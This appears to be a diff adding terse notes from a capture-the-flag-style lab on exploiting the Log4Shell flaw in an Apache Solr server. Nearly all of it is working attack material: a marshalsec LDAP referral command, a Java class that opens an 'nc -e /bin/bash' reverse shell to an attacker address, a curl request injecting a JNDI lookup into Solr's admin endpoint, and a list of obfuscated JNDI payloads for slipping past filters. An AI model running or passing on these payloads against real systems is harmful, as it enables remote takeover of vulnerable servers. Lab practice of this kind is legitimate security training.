@@ -1,0 +1,54 @@
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
+
+
+**********************
+
+java code save as Exploit.java
+
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+**********************
+
+javac Exploit.java -source 8 -target 8
+
+make you Exploit.class
+
+**********************
+
+python3 -m http.server
+
+**********************
+
+nc -lnvp 9999
+
+**********************
+
+curl 'http://10.10.117.207:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
+
+Now you have access
+
+**********************
+
+some payloads for bypass :
+
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+
+${${::-j}ndi:rmi://attackerendpoint.com/}
